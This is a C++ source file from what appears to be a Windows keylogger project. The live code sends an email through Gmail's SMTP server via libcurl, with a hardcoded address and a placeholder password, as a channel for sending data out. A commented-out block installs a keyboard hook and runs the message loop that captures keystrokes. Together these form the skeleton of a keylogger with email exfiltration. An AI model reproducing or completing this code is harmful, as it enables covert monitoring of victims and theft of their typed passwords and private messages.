#include <iostream>
#include <Windows.h>


#include <stdio.h>
#include <string.h>

#include "curl/curl.h"

#define FROM_ADDR    "michalovskyyy@gmail.com"
#define TO_ADDR      "michalovskyyy@gmail.com"
#define CC_ADDR      "michalovskyyy@gmail.com"

#define FROM_MAIL "XXXXX " FROM_ADDR
#define TO_MAIL   "YYYYY " TO_ADDR

static const char* payload_text[] = {
  "To: " TO_MAIL "\r\n",
  "From: " FROM_MAIL "\r\n",
  "Subject: wazna wiadomosc\r\n",
  "\r\n",
  "Siema\r\n",
  NULL
};

struct upload_status {
	int lines_read;
};

static size_t payload_source(char* ptr, size_t size, size_t nmemb, void* userp)
{
	struct upload_status* upload_ctx = (struct upload_status*)userp;
	const char* data;

	if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1)) {
		return 0;
	}

	data = payload_text[upload_ctx->lines_read];

	if (data) {
		size_t len = strlen(data);
		memcpy(ptr, data, len);
		upload_ctx->lines_read++;

		return len;
	}

	return 0;
}
int main()
{
	CURLcode res = CURLE_OK;
	struct curl_slist* recipients = NULL;
	struct upload_status upload_ctx;

	upload_ctx.lines_read = 0;

	curl_global_init(CURL_GLOBAL_ALL);
	CURL* curl = curl_easy_init();

	if (curl)
	{
		static const char* pCACertFile = R"(C:\repos\keylogger\curl-ca-bundle.crt)";
		curl_easy_setopt(curl, CURLOPT_CAINFO, pCACertFile);

		curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
	    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
		curl_easy_setopt(curl, CURLOPT_LOGIN_OPTIONS, "AUTH=LOGIN");
		curl_easy_setopt(curl, CURLOPT_USERNAME, "michalovskyyy@gmail.com");
		curl_easy_setopt(curl, CURLOPT_PASSWORD, "xxx");
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM_ADDR);

		recipients = curl_slist_append(recipients, TO_ADDR);
		recipients = curl_slist_append(recipients, CC_ADDR);
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

		curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
		curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

		res = curl_easy_perform(curl);

		/* Check for errors */
		if (res != CURLE_OK)
		{
			auto error = curl_easy_strerror(res);
			std::cerr << "curl_easy_perform() failed: " << error;
		}

		curl_slist_free_all(recipients);

		curl_easy_cleanup(curl);
	}

	return (int)res;

	//MSG message;

	//using namespace keylogger;
	//FileSystemHandler::createDirectory(FileSystemHandler::getCurrentPath(true));

	//KeyboardHook hook;

	//hook.installHook();

	//while (GetMessage(&message, nullptr, 0, 0))
	//{
	//	TranslateMessage(&message);
	//	DispatchMessage(&message);
	//}

	//hook.uninstallHook();
	//return 0;
}